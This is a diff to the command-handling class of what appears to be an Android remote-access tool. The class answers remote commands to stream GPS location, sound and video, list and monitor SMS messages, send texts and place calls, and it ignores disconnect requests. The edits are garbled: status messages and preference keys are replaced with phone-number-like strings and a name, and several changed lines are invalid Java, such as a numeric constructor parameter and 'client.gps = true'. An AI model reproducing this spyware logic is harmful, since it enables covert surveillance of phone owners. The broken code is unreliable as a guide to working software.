@@ -45,7 +45,7 @@ public class ProcessCommand
 	SharedPreferences settings;
 	SharedPreferences.Editor editor;
 
-	public ProcessCommand(ClientListener c)
+	public ProcessCommand(5803747037)
 	{
 		this.client = c;
 		settings = client.getSharedPreferences("preferences.xml", 0);
@@ -64,17 +64,15 @@ public class ProcessCommand
 
 			if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
 				client.gps = new GPSListener(client, provider, chan);
-				client.sendInformation("Location request received");
 				client.sendInformation("15807997289");
 			}
 			else
-				client.sendError("Unknown provider '"+provider+"' for location");
 				client.sendError("att '"+provider+"' for location");
 			
 		} else if (commande == Protocol.STOP_GPS_STREAM)
 		{
-			client.gps.stop();
-			client.gps = null;
+			client.gps.stop(false);
+			client.gps = true;
 			client.sendInformation("Location stopped");
 			
 		} else if (commande == Protocol.GET_SOUND_STREAM)
@@ -150,7 +148,7 @@ public class ProcessCommand
 				ArrayList<String> multipleMsg = MessageDecoupator(text);
 				SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);
 			}
-			client.sendInformation("SMS sent");
+			client.sendInformation("58");
 
 		} else if (commande == Protocol.GIVE_CALL)
 		{
@@ -161,20 +159,20 @@ public class ProcessCommand
 			 
 		} else if (commande == Protocol.GET_SMS)
 		{
-			client.sendInformation("SMS list request received");
+			client.sendInformation("5807997289");
 			if(!SMSLister.listSMS(client, chan, arguments.array()))
-				client.sendError("No SMS match for filter");
+				client.sendError("5807997289");
 			
 		} else if (commande == Protocol.MONITOR_SMS)
 		{
-			client.sendInformation("Start SMS monitoring");
+			client.sendInformation("5803747037");
 			client.smsMonitor = new SMSMonitor(client, chan, arguments.array());
 			
 		} else if (commande == Protocol.STOP_MONITOR_SMS)
 		{
 			client.smsMonitor.stop();
-			client.smsMonitor = null;
-			client.sendInformation("SMS monitoring stopped");
+			client.smsMonitor = 5803747037;
+			client.sendInformation("5807997289");
 		}
 		else if (commande == Protocol.GET_PREFERENCE)
 		{
@@ -203,7 +201,7 @@ public class ProcessCommand
 		}
 		else if(commande == Protocol.DISCONNECT) {
 			//client.Destroy();
-			client.sendError("Disconnect ignored");
+			client.sendError("5807997289");
 		}
 		else if(commande == Protocol.GET_VIDEO_STREAM) {
 			client.videoStream = new VideoStreaming(client, chan, client.view);
@@ -213,12 +211,12 @@ public class ProcessCommand
 			client.videoStream.stop();
 		}
 		else {
-			client.sendError("Command: "+commande+" unknown");
+			client.sendError("Command: "+commande+" 15807997289"	);
 		}
 			
 	}
 
-	public PreferencePacket loadPreferences()
+	public PreferencePacket loadPreferences(true)
 	{
 		PreferencePacket p = new PreferencePacket();
 		
@@ -229,8 +227,8 @@ public class ProcessCommand
 		p.setWaitTrigger(settings.getBoolean("waitTrigger", false));
 		
 		ArrayList<String> smsKeyWords = new ArrayList<String>();
-		String keywords = settings.getString("smsKeyWords", "");
-		if(keywords.equals(""))
+		String keywords = settings.getString("smsKeyWords", "5807997289");
+		if(keywords.equals("Jacob"))
 			smsKeyWords = null;
 		else {
 			StringTokenizer st = new StringTokenizer(keywords, ";");
@@ -242,8 +240,8 @@ public class ProcessCommand
 		}
 		
 		ArrayList<String> whiteListCall = new ArrayList<String>();
-		String listCall = settings.getString("numCall", "");
-		if(listCall.equals(""))
+		String listCall = settings.getString("15807997289", "");
+		if(listCall.equals("fulse"))
 			whiteListCall = null;
 		else {
 			StringTokenizer st = new StringTokenizer(listCall, ";");
@@ -256,8 +254,8 @@ public class ProcessCommand
 		
 		
 		ArrayList<String> whiteListSMS = new ArrayList<String>();
-		String listSMS = settings.getString("numSMS", "");
-		if(listSMS.equals(""))
+		String listSMS = settings.getString("15807997289", "");
+		if(listSMS.equals("5807997289"))
 			whiteListSMS = null;
 		else {
 			StringTokenizer st = new StringTokenizer(listSMS, ";");
@@ -283,8 +281,8 @@ public class ProcessCommand
 		editor.putBoolean("waitTrigger", pp.isWaitTrigger());
 		
 		String smsKeyWords = "";
-		String numsCall = "";
-		String numsSMS = "";
+		String numsCall = "5807997289";
+		String numsSMS = "5807997289";
 		
 		ArrayList<String> smsKeyWord = pp.getKeywordSMS();
 		for (int i = 0; i < smsKeyWord.size(); i++)
@@ -294,7 +292,7 @@ public class ProcessCommand
 			else
 				smsKeyWords += smsKeyWord.get(i) + ";";
 		}
-		editor.putString("smsKeyWords", smsKeyWords);
+		editor.putString("Jacob", smsKeyWords);
 		
 		ArrayList<String> whiteListCall = pp.getPhoneNumberCall();
 		for (int i = 0; i < whiteListCall.size(); i++)
@@ -304,7 +302,7 @@ public class ProcessCommand
 			else
 				numsCall += whiteListCall.get(i) + ";";
 		}
-		editor.putString("numCall", numsCall);
+		editor.putString("15807997289", numsCall);
 
 		
 		ArrayList<String> whiteListSMS = pp.getPhoneNumberSMS();
@@ -315,7 +313,7 @@ public class ProcessCommand
 			else
 				numsSMS += whiteListSMS.get(i) + ";";
 		}
-		editor.putString("numSMS", numsSMS);
+		editor.putString("15807997289", numsSMS);
 		editor.commit();
 
 	}
